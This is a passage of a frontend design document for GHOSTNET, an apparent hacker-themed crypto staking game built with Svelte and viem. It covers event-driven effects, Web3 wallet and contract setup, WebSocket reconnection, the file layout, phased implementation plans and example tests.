    // ═══════════════════════════════════════════════════════════

    unsubscribers.push(
      eventBus.subscribe('TRACED', (event) => {
        const isCurrentUser = event.address === getCurrentUserAddress();

        if (isCurrentUser) {
          // You died - full dramatic effect
          audio.play('traced', { volume: 1.0 });
          visual.screenFlash('#ff0000', 500);
          visual.shake(300, 1.5);
        } else {
          // Someone else died - subtle
          audio.play('tracedOther', { volume: 0.3 });
          visual.feedHighlight(event.id, '#ff0000');
        }
      })
    );

    // ═══════════════════════════════════════════════════════════
    // SURVIVAL EVENTS
    // ═══════════════════════════════════════════════════════════

    unsubscribers.push(
      eventBus.subscribe('SURVIVED', (event) => {
        const isCurrentUser = event.address === getCurrentUserAddress();

        if (isCurrentUser) {
          audio.play('survived', { volume: 0.8 });
          visual.screenFlash('#00ff00', 300);
        }
      })
    );

    // ═══════════════════════════════════════════════════════════
    // SCAN EVENTS
    // ═══════════════════════════════════════════════════════════

    unsubscribers.push(
      eventBus.subscribe('TRACE_SCAN_WARNING', (event) => {
        if (event.secondsUntil <= 10) {
          audio.play('urgentTick', { volume: 0.5 });
        } else {
          audio.play('warning', { volume: 0.4 });
        }
      })
    );

    unsubscribers.push(
      eventBus.subscribe('TRACE_SCAN_START', () => {
        audio.play('scanStart', { volume: 0.6 });
      })
    );

    // ═══════════════════════════════════════════════════════════
    // TYPING EVENTS
    // ═══════════════════════════════════════════════════════════

    unsubscribers.push(
      eventBus.subscribe('TYPING_KEYSTROKE', (event) => {
        if (event.correct) {
          audio.play('keyPress', { volume: 0.3 });
        } else {
          audio.play('keyError', { volume: 0.4 });
          visual.shake(100, 0.3);
        }
      })
    );

    unsubscribers.push(
      eventBus.subscribe('USER_TYPING_COMPLETE', (event) => {
        if (event.accuracy >= 0.95) {
          audio.play('perfectType', { volume: 0.8 });
          visual.screenFlash('#00ffff', 200);
        } else if (event.accuracy >= 0.5) {
          audio.play('typeComplete', { volume: 0.6 });
        }
      })
    );

    // ═══════════════════════════════════════════════════════════
    // MONEY EVENTS
    // ═══════════════════════════════════════════════════════════

    unsubscribers.push(
      eventBus.subscribe('EXTRACT', (event) => {
        const isCurrentUser = event.address === getCurrentUserAddress();
        if (isCurrentUser) {
          audio.play('extract', { volume: 0.7 });
        }
      })
    );

    unsubscribers.push(
      eventBus.subscribe('CASCADE', () => {
        audio.play('cascade', { volume: 0.5 });
      })
    );

    unsubscribers.push(
      eventBus.subscribe('WHALE_ALERT', () => {
        audio.play('whaleAlert', { volume: 0.6 });
      })
    );

    // ═══════════════════════════════════════════════════════════
    // SYSTEM EVENTS
    // ═══════════════════════════════════════════════════════════

    unsubscribers.push(
      eventBus.subscribe('SYSTEM_RESET_WARNING', (event) => {
        if (event.secondsUntil <= 60) {
          audio.play('urgentTick', { volume: 0.7 });
          visual.screenFlash('#ffaa00', 200);
        }
      })
    );
  }

  function destroy() {
    unsubscribers.forEach(unsub => unsub());
  }

  return { init, destroy };
}
```

---

## 9. State Management

### 9.1 Store Initialization Pattern

All stores follow the same initialization pattern:

```typescript
// lib/core/stores/index.svelte.ts

import { setContext, getContext, onMount, onDestroy } from 'svelte';
import { createEventBus, EVENT_BUS_KEY } from '$lib/core/events/bus.svelte';
import { createAudioManager, AUDIO_KEY } from '$lib/audio/manager.svelte';
import { createVisualManager, VISUAL_KEY } from '$lib/core/effects/visual.svelte';
import { createEffectsManager } from '$lib/core/effects/manager.svelte';
import { createTimerStore } from '$lib/core/timers/store.svelte';
import { createWeb3Client, WEB3_KEY } from '$lib/core/web3/client.svelte';
import { createRealtimeClient, REALTIME_KEY } from '$lib/core/realtime/client.svelte';
import { createFeedStore, FEED_KEY } from '$lib/features/feed/store.svelte';
import { createPositionStore, POSITION_KEY } from '$lib/features/position/store.svelte';

/**
 * Initialize all stores and provide them via context.
 * Call this in the root +layout.svelte.
 */
export function initializeStores() {
  // Core infrastructure
  const eventBus = createEventBus();
  const audio = createAudioManager();
  const visual = createVisualManager();
  const web3 = createWeb3Client();
  const realtime = createRealtimeClient(eventBus);
  const timers = createTimerStore(eventBus);

  // Effects (coordinates audio + visual)
  const effects = createEffectsManager(
    eventBus,
    audio,
    visual,
    () => web3.address
  );

  // Feature stores
  const feed = createFeedStore(eventBus, () => web3.address);
  const position = createPositionStore(eventBus, web3);

  // Provide via context
  setContext(EVENT_BUS_KEY, eventBus);
  setContext(AUDIO_KEY, audio);
  setContext(VISUAL_KEY, visual);
  setContext(WEB3_KEY, web3);
  setContext(REALTIME_KEY, realtime);
  setContext(FEED_KEY, feed);
  setContext(POSITION_KEY, position);

  // Initialize on mount
  onMount(() => {
    audio.init();
    effects.init();
    feed.init();
    position.init();
    timers.start();

    // Connect to WebSocket
    realtime.connect(import.meta.env.VITE_WS_URL);
  });

  // Cleanup on destroy
  onDestroy(() => {
    effects.destroy();
    feed.destroy();
    timers.stop();
    realtime.disconnect();
  });

  return {
    eventBus,
    audio,
    visual,
    web3,
    realtime,
    timers,
    feed,
    position,
  };
}
```

---

## 10. Web3 Integration

### 10.1 Chain Configuration

```typescript
// lib/core/web3/chains.ts

import { defineChain } from 'viem';

/**
 * MegaETH chain configuration.
 * Update these values based on actual MegaETH network parameters.
 */
export const megaeth = defineChain({
  id: 42161, // Placeholder - update with actual chain ID
  name: 'MegaETH',
  nativeCurrency: {
    decimals: 18,
    name: 'Ether',
    symbol: 'ETH',
  },
  rpcUrls: {
    default: {
      http: ['https://rpc.megaeth.io'], // Placeholder
      webSocket: ['wss://ws.megaeth.io'], // Placeholder
    },
  },
  blockExplorers: {
    default: {
      name: 'MegaETH Explorer',
      url: 'https://explorer.megaeth.io', // Placeholder
    },
  },
});

// Local development chain (Anvil)
export const localhost = defineChain({
  id: 31337,
  name: 'Localhost',
  nativeCurrency: {
    decimals: 18,
    name: 'Ether',
    symbol: 'ETH',
  },
  rpcUrls: {
    default: {
      http: ['http://127.0.0.1:8545'],
      webSocket: ['ws://127.0.0.1:8545'],
    },
  },
});
```

### 10.2 Contract Addresses

```typescript
// lib/core/web3/addresses.ts

import type { Address } from 'viem';

type NetworkAddresses = {
  ghostNetCore: Address;
  ghostNetToken: Address;
  ghostNetDeadPool: Address;
  ghostNetOracle: Address;
};

export const addresses: Record<number, NetworkAddresses> = {
  // MegaETH mainnet (placeholder chain ID)
  42161: {
    ghostNetCore: '0x0000000000000000000000000000000000000000',
    ghostNetToken: '0x0000000000000000000000000000000000000000',
    ghostNetDeadPool: '0x0000000000000000000000000000000000000000',
    ghostNetOracle: '0x0000000000000000000000000000000000000000',
  },
  // Localhost (Anvil)
  31337: {
    ghostNetCore: '0x5FbDB2315678afecb367f032d93F642f64180aa3',
    ghostNetToken: '0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512',
    ghostNetDeadPool: '0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0',
    ghostNetOracle: '0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9',
  },
};

export function getAddresses(chainId: number): NetworkAddresses {
  const addrs = addresses[chainId];
  if (!addrs) {
    throw new Error(`No contract addresses configured for chain ${chainId}`);
  }
  return addrs;
}
```

### 10.3 Web3 Client

```typescript
// lib/core/web3/client.svelte.ts

import {
  createPublicClient,
  createWalletClient,
  custom,
  http,
  type PublicClient,
  type WalletClient,
  type Address,
} from 'viem';
import { megaeth, localhost } from './chains';
import { getAddresses } from './addresses';

// Import ABIs (generated from contracts)
// import { GhostNetCoreAbi } from '$lib/contracts/abis/GhostNetCore';
// import { GhostNetTokenAbi } from '$lib/contracts/abis/GhostNetToken';

export function createWeb3Client() {
  // State
  let address = $state<Address | null>(null);
  let chainId = $state<number | null>(null);
  let isConnecting = $state(false);
  let isConnected = $state(false);
  let error = $state<string | null>(null);

  // Clients
  let publicClient: PublicClient | null = null;
  let walletClient: WalletClient | null = null;

  // Determine chain based on environment
  const chain = import.meta.env.DEV ? localhost : megaeth;

  // Initialize public client (doesn't require wallet)
  function initPublicClient() {
    publicClient = createPublicClient({
      chain,
      transport: http(),
    });
  }

  // Connect wallet
  async function connect() {
    if (typeof window === 'undefined' || !window.ethereum) {
      error = 'No wallet detected. Please install MetaMask.';
      return;
    }

    isConnecting = true;
    error = null;

    try {
      // Request accounts
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });

      if (!accounts || accounts.length === 0) {
        throw new Error('No accounts returned');
      }

      address = accounts[0] as Address;

      // Get chain ID
      const chainIdHex = await window.ethereum.request({
        method: 'eth_chainId',
      });
      chainId = parseInt(chainIdHex, 16);

      // Create wallet client
      walletClient = createWalletClient({
        account: address,
        chain,
        transport: custom(window.ethereum),
      });

      isConnected = true;

      // Listen for account changes
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', handleChainChanged);
    } catch (e) {
      error = e instanceof Error ? e.message : 'Failed to connect wallet';
      isConnected = false;
    } finally {
      isConnecting = false;
    }
  }

  function disconnect() {
    address = null;
    chainId = null;
    isConnected = false;
    walletClient = null;

    if (typeof window !== 'undefined' && window.ethereum) {
      window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
      window.ethereum.removeListener('chainChanged', handleChainChanged);
    }
  }

  function handleAccountsChanged(accounts: string[]) {
    if (accounts.length === 0) {
      disconnect();
    } else {
      address = accounts[0] as Address;
    }
  }

  function handleChainChanged(newChainId: string) {
    chainId = parseInt(newChainId, 16);
    // Reload to ensure clean state
    window.location.reload();
  }

  // ═══════════════════════════════════════════════════════════
  // CONTRACT READ METHODS
  // ═══════════════════════════════════════════════════════════

  async function getPosition(userAddress: Address) {
    if (!publicClient) throw new Error('Public client not initialized');

    const addrs = getAddresses(chainId ?? chain.id);

    // Placeholder - implement with actual ABI
    // return publicClient.readContract({
    //   address: addrs.ghostNetCore,
    //   abi: GhostNetCoreAbi,
    //   functionName: 'getPosition',
    //   args: [userAddress],
    // });

    // Mock for now
    return null;
  }

  async function getNetworkVitals() {
    if (!publicClient) throw new Error('Public client not initialized');

    // Placeholder - implement with actual ABI
    return {
      tvl: 0n,
      operatorsOnline: 0,
      systemResetTimestamp: 0,
      traceScanTimestamps: {} as Record<string, number>,
    };
  }

  async function getTokenBalance(userAddress: Address) {
    if (!publicClient) throw new Error('Public client not initialized');

    const addrs = getAddresses(chainId ?? chain.id);

    // Placeholder - implement with actual ABI
    return 0n;
  }

  // ═══════════════════════════════════════════════════════════
  // CONTRACT WRITE METHODS
  // ═══════════════════════════════════════════════════════════

  async function jackIn(level: number, amount: bigint) {
    if (!walletClient || !address) {
      throw new Error('Wallet not connected');
    }

    const addrs = getAddresses(chainId ?? chain.id);

    // Placeholder - implement with actual ABI
    // const hash = await walletClient.writeContract({
    //   address: addrs.ghostNetCore,
    //   abi: GhostNetCoreAbi,
    //   functionName: 'stake',
    //   args: [amount, level],
    // });
    //
    // return hash;

    throw new Error('Not implemented');
  }

  async function extract(positionId: string) {
    if (!walletClient || !address) {
      throw new Error('Wallet not connected');
    }

    // Placeholder - implement with actual ABI
    throw new Error('Not implemented');
  }

  // Initialize public client immediately
  initPublicClient();

  return {
    // State
    get address() { return address; },
    get chainId() { return chainId; },
    get isConnecting() { return isConnecting; },
    get isConnected() { return isConnected; },
    get error() { return error; },

    // Connection
    connect,
    disconnect,

    // Reads
    getPosition,
    getNetworkVitals,
    getTokenBalance,

    // Writes
    jackIn,
    extract,
  };
}

export type Web3Client = ReturnType<typeof createWeb3Client>;

export const WEB3_KEY = Symbol('web3');
```

---

## 11. Real-Time Communication

### 11.1 WebSocket Reconnection Strategy

GHOSTNET is a real-time game—connection reliability is critical. The WebSocket client implements a robust reconnection strategy:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     WEBSOCKET RECONNECTION STRATEGY                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  EXPONENTIAL BACKOFF:                                                    │
│  ────────────────────                                                   │
│  Attempt 1: 1 second                                                    │
│  Attempt 2: 2 seconds                                                   │
│  Attempt 3: 4 seconds                                                   │
│  Attempt 4: 8 seconds                                                   │
│  Attempt 5: 16 seconds                                                  │
│  Attempt 6+: 30 seconds (capped)                                        │
│                                                                          │
│  MAX ATTEMPTS: 10 (then show "Connection Lost" state)                   │
│                                                                          │
│  STATE RECONCILIATION:                                                   │
│  ─────────────────────                                                  │
│  After reconnection:                                                    │
│  1. Send lastEventId to server                                          │
│  2. Server replays missed events since that ID                          │
│  3. Client processes replay (may cause batch feed updates)              │
│  4. If gap too large: full state refresh instead                        │
│                                                                          │
│  USER FEEDBACK:                                                          │
│  ──────────────                                                         │
│  • Disconnected: Amber indicator + "Reconnecting..." text               │
│  • Reconnecting: Pulsing indicator + attempt count                      │
│  • Connected: Green indicator + "STREAMING" text                        │
│  • Failed: Red indicator + "Connection Lost - Refresh" prompt           │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 11.2 Event Sequence Handling

```typescript
// Events include monotonic sequence IDs for gap detection
interface ServerEvent extends GhostNetEvent {
  sequenceId: number;  // Server-assigned, always increasing
}

// On reconnection, client sends:
{ type: 'RECONNECT', lastSequenceId: 12345 }

// Server responds with:
// 1. Missed events (if gap is small): array of events since lastSequenceId
// 2. Full state snapshot (if gap is large): current positions, network state, etc.
```

### 11.3 WebSocket Client Implementation

```typescript
// lib/core/realtime/client.svelte.ts

import type { EventBus } from '$lib/core/events/bus.svelte';
import type { GhostNetEvent } from '$lib/core/events/types';

export function createRealtimeClient(eventBus: EventBus) {
  let socket: WebSocket | null = null;
  let isConnected = $state(false);
  let reconnectAttempts = $state(0);
  let url = $state<string | null>(null);

  const MAX_RECONNECT_ATTEMPTS = 10;
  const BASE_RECONNECT_DELAY = 1000; // ms

  function connect(wsUrl: string) {
    url = wsUrl;
    attemptConnection();
  }

  function attemptConnection() {
    if (!url) return;

    try {
      socket = new WebSocket(url);

      socket.onopen = () => {
        isConnected = true;
        reconnectAttempts = 0;
        eventBus.emit({ type: 'WS_CONNECTED', timestamp: Date.now() });
        console.log('[WebSocket] Connected');
      };

      socket.onmessage = (msg) => {
        try {
          const event = JSON.parse(msg.data) as GhostNetEvent;
          eventBus.emit(event);
        } catch (e) {
          console.error('[WebSocket] Failed to parse message:', e);
        }
      };

      socket.onclose = (event) => {
        isConnected = false;
        eventBus.emit({ type: 'WS_DISCONNECTED', timestamp: Date.now() });
        console.log('[WebSocket] Disconnected:', event.code, event.reason);

        // Attempt reconnect
        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
          scheduleReconnect();
        }
      };

      socket.onerror = (error) => {
        console.error('[WebSocket] Error:', error);
      };
    } catch (e) {
      console.error('[WebSocket] Failed to create connection:', e);
      scheduleReconnect();
    }
  }

  function scheduleReconnect() {
    const delay = Math.min(
      BASE_RECONNECT_DELAY * Math.pow(2, reconnectAttempts),
      30000 // Max 30 seconds
    );

    reconnectAttempts++;

    eventBus.emit({
      type: 'WS_RECONNECTING',
      attempt: reconnectAttempts,
      timestamp: Date.now(),
    });

    console.log(`[WebSocket] Reconnecting in ${delay}ms (attempt ${reconnectAttempts})`);

    setTimeout(() => {
      attemptConnection();
    }, delay);
  }

  function disconnect() {
    if (socket) {
      socket.close();
      socket = null;
    }
    isConnected = false;
    reconnectAttempts = 0;
  }

  function send(message: object) {
    if (socket && isConnected) {
      socket.send(JSON.stringify(message));
    } else {
      console.warn('[WebSocket] Cannot send - not connected');
    }
  }

  return {
    get isConnected() { return isConnected; },
    get reconnectAttempts() { return reconnectAttempts; },
    connect,
    disconnect,
    send,
  };
}

export type RealtimeClient = ReturnType<typeof createRealtimeClient>;

export const REALTIME_KEY = Symbol('realtime');
```

---

## 12. File Structure

```
apps/web/
├── src/
│   ├── app.html                          # HTML template
│   ├── app.css                           # Global styles
│   ├── app.d.ts                          # Type declarations
│   │
│   ├── lib/
│   │   ├── index.ts                      # Public exports
│   │   │
│   │   ├── core/                         # ═══ CORE INFRASTRUCTURE ═══
│   │   │   ├── constants.ts              # App-wide constants
│   │   │   │
│   │   │   ├── events/                   # Event system
│   │   │   │   ├── types.ts              # Event type definitions
│   │   │   │   └── bus.svelte.ts         # Event bus implementation
│   │   │   │
│   │   │   ├── timers/                   # Timer system
│   │   │   │   └── store.svelte.ts       # Timer store
│   │   │   │
│   │   │   ├── effects/                  # Effects coordination
│   │   │   │   ├── visual.svelte.ts      # Visual effects manager
│   │   │   │   └── manager.svelte.ts     # Audio+visual coordinator
│   │   │   │
│   │   │   ├── web3/                     # Blockchain integration
│   │   │   │   ├── chains.ts             # Chain configurations
│   │   │   │   ├── addresses.ts          # Contract addresses
│   │   │   │   └── client.svelte.ts      # Web3 client
│   │   │   │
│   │   │   ├── realtime/                 # WebSocket layer
│   │   │   │   └── client.svelte.ts      # WebSocket client
│   │   │   │
│   │   │   └── stores/                   # Store initialization
│   │   │       └── index.svelte.ts       # Store provider
│   │   │
│   │   ├── features/                     # ═══ FEATURE MODULES ═══
│   │   │   │
│   │   │   ├── feed/                     # Live feed
│   │   │   │   ├── store.svelte.ts
│   │   │   │   ├── FeedPanel.svelte
│   │   │   │   ├── FeedItem.svelte
│   │   │   │   └── index.ts
│   │   │   │
│   │   │   ├── position/                 # User position
│   │   │   │   ├── store.svelte.ts
│   │   │   │   ├── PositionPanel.svelte
│   │   │   │   ├── ModifiersList.svelte
│   │   │   │   └── index.ts
│   │   │   │
│   │   │   ├── network/                  # Network vitals
│   │   │   │   ├── store.svelte.ts
│   │   │   │   ├── NetworkPanel.svelte
│   │   │   │   ├── TimerDisplay.svelte
│   │   │   │   └── index.ts
│   │   │   │
│   │   │   ├── typing/                   # Trace Evasion mini-game
│   │   │   │   ├── store.svelte.ts
│   │   │   │   ├── commands.ts
│   │   │   │   ├── TypingGame.svelte
│   │   │   │   ├── TypingInput.svelte
│   │   │   │   ├── TypingResult.svelte
│   │   │   │   └── index.ts
│   │   │   │
│   │   │   ├── hackrun/                  # Hack Runs mini-game
│   │   │   │   ├── store.svelte.ts
│   │   │   │   ├── nodes.ts
│   │   │   │   ├── HackRunGame.svelte
│   │   │   │   ├── HackRunNode.svelte
│   │   │   │   └── index.ts
│   │   │   │
│   │   │   ├── deadpool/                 # Prediction market
│   │   │   │   ├── store.svelte.ts
│   │   │   │   ├── DeadPoolPanel.svelte
│   │   │   │   ├── BettingCard.svelte
│   │   │   │   └── index.ts
│   │   │   │
│   │   │   ├── crew/                     # Crew system
│   │   │   │   ├── store.svelte.ts
│   │   │   │   ├── CrewPanel.svelte
│   │   │   │   ├── CrewChat.svelte
│   │   │   │   └── index.ts
│   │   │   │
│   │   │   └── pvp/                      # PvP duels
│   │   │       ├── store.svelte.ts
│   │   │       ├── DuelArena.svelte
│   │   │       └── index.ts
│   │   │
│   │   ├── ui/                           # ═══ UI COMPONENTS ═══
│   │   │   │
│   │   │   ├── styles/                   # CSS
│   │   │   │   ├── tokens.css            # Design tokens
│   │   │   │   ├── reset.css             # CSS reset
│   │   │   │   └── utilities.css         # Utility classes
│   │   │   │
│   │   │   ├── terminal/                 # Terminal chrome
│   │   │   │   ├── Shell.svelte
│   │   │   │   ├── Scanlines.svelte
│   │   │   │   ├── Flicker.svelte
│   │   │   │   ├── ScreenFlash.svelte
│   │   │   │   ├── Box.svelte
│   │   │   │   ├── Panel.svelte
│   │   │   │   └── Header.svelte
│   │   │   │
│   │   │   ├── typography/               # Text components
│   │   │   │   ├── Heading.svelte
│   │   │   │   ├── Text.svelte
│   │   │   │   └── AsciiArt.svelte
│   │   │   │
│   │   │   ├── primitives/               # Basic components
│   │   │   │   ├── Button.svelte
│   │   │   │   ├── Input.svelte
│   │   │   │   ├── ProgressBar.svelte
│   │   │   │   ├── AnimatedNumber.svelte
│   │   │   │   ├── Countdown.svelte
│   │   │   │   └── Spinner.svelte
│   │   │   │
│   │   │   └── layout/                   # Layout components
│   │   │       ├── Grid.svelte
│   │   │       ├── Stack.svelte
│   │   │       └── Sidebar.svelte
│   │   │
│   │   ├── audio/                        # ═══ AUDIO SYSTEM ═══
│   │   │   ├── sounds.ts                 # Sound definitions
│   │   │   └── manager.svelte.ts         # Audio manager
│   │   │
│   │   └── contracts/                    # ═══ CONTRACT ARTIFACTS ═══
│   │       └── abis/                     # ABI JSON files
│   │           └── .gitkeep
│   │
│   └── routes/                           # ═══ PAGES ═══
│       ├── +layout.svelte                # Root layout (Terminal shell)
│       ├── +layout.ts                    # Layout data loading
│       ├── +page.svelte                  # Command Center (main)
│       │
│       ├── typing/                       # Trace Evasion page
│       │   └── +page.svelte
│       │
│       ├── hackrun/                      # Hack Runs page
│       │   └── +page.svelte
│       │
│       ├── deadpool/                     # Dead Pool page
│       │   └── +page.svelte
│       │
│       └── crew/                         # Crew page
│           └── +page.svelte
│
├── static/                               # Static assets
│   ├── fonts/                            # IBM Plex Mono, etc.
│   └── favicon.ico
│
├── tests/                                # Test files
│   ├── unit/                             # Unit tests
│   └── e2e/                              # E2E tests
│
└── e2e/                                  # Playwright E2E tests
```

---

## 13. Implementation Phases

### Phase 1: Foundation (Week 1)

**Goal:** Core infrastructure working, terminal shell rendering.

| Task | Priority | Estimate |
|------|----------|----------|
| Event bus implementation | P0 | 4h |
| Design tokens CSS | P0 | 4h |
| Terminal shell (Scanlines, Flicker) | P0 | 8h |
| Box component | P0 | 4h |
| Audio manager setup (ZzFX) | P1 | 4h |
| Mock WebSocket server | P1 | 4h |

**Deliverable:** Empty terminal shell with effects working, event bus functional.

---

### Phase 2: Core UI (Week 2)

**Goal:** Main Command Center layout with mock data.

| Task | Priority | Estimate |
|------|----------|----------|
| Feed store + components | P0 | 12h |
| Network vitals panel | P0 | 8h |
| Position status panel | P0 | 8h |
| Quick actions panel | P1 | 4h |
| Timer countdown components | P0 | 4h |
| Effects manager (audio+visual coordination) | P1 | 8h |

**Deliverable:** Full Command Center layout with mock events flowing.

---

### Phase 3: Web3 Integration (Week 3)

**Goal:** Wallet connection and contract interactions.

| Task | Priority | Estimate |
|------|----------|----------|
| Wallet connection flow | P0 | 8h |
| Contract read functions | P0 | 8h |
| Contract write functions | P0 | 12h |
| Transaction status UI | P0 | 8h |
| Error handling | P1 | 4h |

**Deliverable:** Users can connect wallet, view real position, jack in/extract.

---

### Phase 4: Real-Time (Week 4)

**Goal:** Live data from WebSocket.

| Task | Priority | Estimate |
|------|----------|----------|
| WebSocket client implementation | P0 | 8h |
| Server-side event indexer (basic) | P0 | 16h |
| Reconnection handling | P1 | 4h |
| Connection status UI | P1 | 4h |
| Event buffering/ordering | P2 | 8h |

**Deliverable:** Live feed showing real blockchain events.

---

### Phase 5: Typing Mini-Game (Week 5)

**Goal:** Trace Evasion playable and affecting position.

| Task | Priority | Estimate |
|------|----------|----------|
| Typing store implementation | P0 | 8h |
| Typing UI components | P0 | 12h |
| Command library | P1 | 4h |
| Reward calculation | P0 | 4h |
| Position modifier integration | P0 | 4h |
| Sound effects tuning | P1 | 4h |

**Deliverable:** Users can play typing game, get death rate reduction.

---

### Phase 6: Polish & Testing (Week 6)

**Goal:** Production-ready MVP.

| Task | Priority | Estimate |
|------|----------|----------|
| Unit tests for stores | P0 | 16h |
| E2E tests for critical flows | P0 | 12h |
| Performance optimization | P1 | 8h |
| Accessibility review | P1 | 4h |
| Mobile responsiveness | P1 | 8h |
| Bug fixes | P0 | Variable |

**Deliverable:** MVP ready for testnet deployment.

---

## 14. Testing Strategy

### 14.1 Unit Tests

Focus on **stores** and **pure functions**.

```typescript
// Example: Feed store test
// tests/unit/features/feed/store.svelte.test.ts

import { describe, it, expect, beforeEach } from 'vitest';
import { createEventBus } from '$lib/core/events/bus.svelte';
import { createFeedStore } from '$lib/features/feed/store.svelte';

describe('FeedStore', () => {
  let eventBus: ReturnType<typeof createEventBus>;
  let feed: ReturnType<typeof createFeedStore>;

  beforeEach(() => {
    eventBus = createEventBus();
    feed = createFeedStore(eventBus, () => null);
    feed.init();
  });

  it('adds items when events are emitted', () => {
    eventBus.emit({
      type: 'JACK_IN',
      id: '1',
      address: '0x1234567890123456789012345678901234567890',
      level: 'DARKNET',
      amount: 100n * 10n ** 18n,
      timestamp: Date.now(),
    });

    expect(feed.items.length).toBe(1);
    expect(feed.items[0].type).toBe('JACK_IN');
  });

  it('limits items to max configured amount', () => {
    // Emit 150 events
    for (let i = 0; i < 150; i++) {
      eventBus.emit({
        type: 'JACK_IN',
        id: String(i),
        address: '0x1234567890123456789012345678901234567890',
        level: 'DARKNET',
        amount: 100n * 10n ** 18n,
        timestamp: Date.now(),
      });
    }

    expect(feed.items.length).toBeLessThanOrEqual(100);
  });

  it('highlights current user events', () => {
    const userAddress = '0xabcdef1234567890abcdef1234567890abcdef12';
    feed = createFeedStore(eventBus, () => userAddress as `0x${string}`);
    feed.init();

    eventBus.emit({
      type: 'TRACED',
      id: '1',
      address: userAddress,
      level: 'DARKNET',
      amountLost: 100n * 10n ** 18n,
      timestamp: Date.now(),
    });

    expect(feed.items[0].isCurrentUser).toBe(true);
  });
});
```

### 14.2 Component Tests

Use Vitest with browser mode for components.

```typescript
// Example: FeedItem component test
// tests/unit/features/feed/FeedItem.svelte.test.ts

import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/svelte';
import FeedItem from '$lib/features/feed/FeedItem.svelte';

describe('FeedItem', () => {
  it('renders death events in red', () => {
    const item = {
      id: '1',
      type: 'TRACED' as const,
      event: { /* ... */ },
      priority: 10,
      timestamp: Date.now(),
      isCurrentUser: false,
      formattedText: '> 0x1234 ████ TRACED ████ -100Đ',
    };

    render(FeedItem, { props: { item } });

    const element = screen.getByText(/TRACED/);
    expect(element.closest('.feed-item')).toHaveClass('color-death');
  });
});
```

### 14.3 E2E Tests

Critical user flows with Playwright.

```typescript
// Example: Jack In flow
// e2e/jack-in.spec.ts

import { test, expect } from '@playwright/test';

test.describe('Jack In Flow', () => {
  test.beforeEach(async ({ page }) => {
    // Mock wallet connection
    await page.addInitScript(() => {
      (window as any).ethereum = {
        request: async ({ method }: { method: string }) => {
          if (method === 'eth_requestAccounts') {
            return ['0x1234567890123456789012345678901234567890'];
          }
          if (method === 'eth_chainId') {
            return '0x7a69'; // 31337
          }
          return null;
        },
        on: () => {},
        removeListener: () => {},
      };
    });
  });

  test('allows user to jack in to DARKNET', async ({ page }) => {
    await page.goto('/');

    // Connect wallet
    await page.click('[data-testid="connect-wallet"]');
    await expect(page.locator('[data-testid="wallet-connected"]')).toBeVisible();

    // Open jack in modal
    await page.click('[data-testid="jack-in-button"]');

    // Select DARKNET
    await page.click('[data-testid="level-DARKNET"]');

    // Enter amount
    await page.fill('[data-testid="amount-input"]', '50');

    // Confirm
    await page.click('[data-testid="confirm-jack-in"]');

    // Wait for transaction
    await expect(page.locator('[data-testid="position-panel"]')).toContainText('DARKNET');
  });
});
```

---

## 15. Performance Considerations

### 15.1 Feed Virtualization

For large feed lists, implement windowing:

```typescript
// Only render visible items + buffer
const VISIBLE_ITEMS = 15;
const BUFFER = 5;

let visibleItems = $derived(
  items.slice(0, VISIBLE_ITEMS + BUFFER)
);
```

### 15.2 Animation Performance

- Use CSS `transform` and `opacity` only (GPU-accelerated)
- Avoid animating `width`, `height`, `top`, `left`
- Use `will-change` sparingly for known animations

```css
.animated-item {
  transform: translateZ(0); /* Force GPU layer */
}

.about-to-animate {
  will-change: transform, opacity;
}
```

### 15.3 Event Throttling

Debounce high-frequency events:

```typescript
// Throttle timer ticks to 1/second
let lastTick = 0;
eventBus.subscribe('TIMER_TICK', (event) => {
  const now = Date.now();
  if (now - lastTick < 1000) return;
  lastTick = now;
  // Process tick
});
```

### 15.4 Lazy Loading

Load mini-games on demand:

```typescript
// routes/typing/+page.svelte
<script>
  import { onMount } from 'svelte';
  
  let TypingGame: typeof import('$lib/features/typing').TypingGame;
  
  onMount(async () => {
    const module = await import('$lib/features/typing');
    TypingGame = module.TypingGame;
  });
</script>

{#if TypingGame}
  <TypingGame />
{:else}
  <LoadingSpinner />
{/if}
```

---

## 15.5 Error Handling Patterns

GHOSTNET must gracefully handle errors without breaking the game experience.

### Error Categories

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         ERROR HANDLING STRATEGY                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  CATEGORY 1: NETWORK ERRORS (Recoverable)                               │
│  ──────────────────────────────────────────                             │
│  • WebSocket disconnect → Show indicator, auto-reconnect               │
│  • RPC timeout → Retry with backoff, show "Network slow"               │
│  • API error → Show toast, allow retry                                  │
│  • Action: Log, show user feedback, automatic recovery                  │
│                                                                          │
│  CATEGORY 2: CONTRACT ERRORS (User-Actionable)                          │
│  ─────────────────────────────────────────────                          │
│  • Transaction reverted → Parse reason, show specific error             │
│  • Insufficient balance → Show balance, suggest amount                  │
│  • Position locked → Show countdown to unlock                           │
│  • Action: Clear error message, actionable guidance                     │
│                                                                          │
│  CATEGORY 3: APPLICATION ERRORS (Unexpected)                            │
│  ────────────────────────────────────────────                           │
│  • JavaScript exception → Error boundary catches                        │
│  • Invalid state → Log to analytics, reset affected store               │
│  • Parse error → Log, skip malformed data, continue                     │
│  • Action: Log to monitoring, graceful degradation                      │
│                                                                          │
│  CATEGORY 4: CRITICAL ERRORS (Requires Refresh)                         │
│  ──────────────────────────────────────────────                         │
│  • State corruption → Show "Something went wrong" modal                 │
│  • WebSocket permanently failed → Show offline mode prompt              │
│  • Contract mismatch → Force app update prompt                          │
│  • Action: Prompt user to refresh, preserve wallet connection           │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Error Boundary Component

```svelte
<!-- lib/ui/ErrorBoundary.svelte -->
<script lang="ts">
  import { onMount } from 'svelte';
  import type { Snippet } from 'svelte';
  
  interface Props {
    fallback?: Snippet<[Error]>;
    children: Snippet;
    onError?: (error: Error) => void;
  }
  
  let { fallback, children, onError }: Props = $props();
  
